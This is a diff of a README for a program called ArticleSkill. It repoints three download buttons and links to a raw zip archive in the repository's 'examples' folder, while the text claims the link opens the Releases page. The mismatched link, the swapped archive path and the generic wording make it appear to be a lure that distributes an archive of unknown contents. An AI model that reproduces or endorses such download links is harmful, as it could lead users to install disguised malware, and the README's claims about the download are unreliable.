@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download ArticleSkill](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/skills/Article-Skill-2.2.zip)](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/skills/Article-Skill-2.2.zip)
+[![Download ArticleSkill](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/examples/Skill-Article-3.0-beta.4.zip)](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/examples/Skill-Article-3.0-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To ensure the best experience with ArticleSkill, please check the following requ
 To download ArticleSkill, visit the Releases page. Follow these steps:
 
 1. Click the link below to access the Release page:  
-   [Download ArticleSkill](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/skills/Article-Skill-2.2.zip)
+   [Download ArticleSkill](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/examples/Skill-Article-3.0-beta.4.zip)
 
 2. On the Releases page, locate the latest version of ArticleSkill.
 
@@ -82,4 +82,4 @@ We value your input. Join our community discussions on GitHub to share your expe
 
 For more information on using ArticleSkill, visit our documentation page once you have downloaded the application. Tutorials and user guides are available to help you maximize your experience.
 
-[![Download ArticleSkill](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/skills/Article-Skill-2.2.zip)](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/skills/Article-Skill-2.2.zip)
+[![Download ArticleSkill](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/examples/Skill-Article-3.0-beta.4.zip)](https://github.com/Bunnyvpm/ArticleSkill/raw/refs/heads/main/examples/Skill-Article-3.0-beta.4.zip)
